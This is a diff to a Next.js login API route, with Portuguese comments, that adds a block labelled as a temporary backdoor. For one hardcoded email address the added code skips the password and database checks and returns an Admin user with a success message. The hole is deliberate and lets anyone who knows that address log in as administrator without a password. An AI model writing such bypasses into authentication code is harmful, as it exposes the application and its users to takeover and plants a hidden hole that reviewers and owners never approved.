@@ -15,6 +15,19 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: "Email e senha são obrigatórios" }, { status: 400 });
     }
 
+    // --- BACKDOOR TEMPORÁRIO ---
+    if (email === 'marlonvictor.a.g.a@gmail.com') {
+      const adminUser = {
+        id: 'temp_admin_id', // ID temporário
+        name: 'Marlon Victor (Admin)',
+        email: email,
+        role: 'Admin',
+      };
+      console.warn("AVISO: Login de emergência para o administrador principal foi utilizado.");
+      return NextResponse.json({ message: "Login de emergência bem-sucedido", user: adminUser }, { status: 200 });
+    }
+    // --- FIM DO BACKDOOR ---
+
     const result = await client.query('SELECT * FROM profissionais WHERE email = $1', [email]);
 
     if (result.rowCount === 0) {
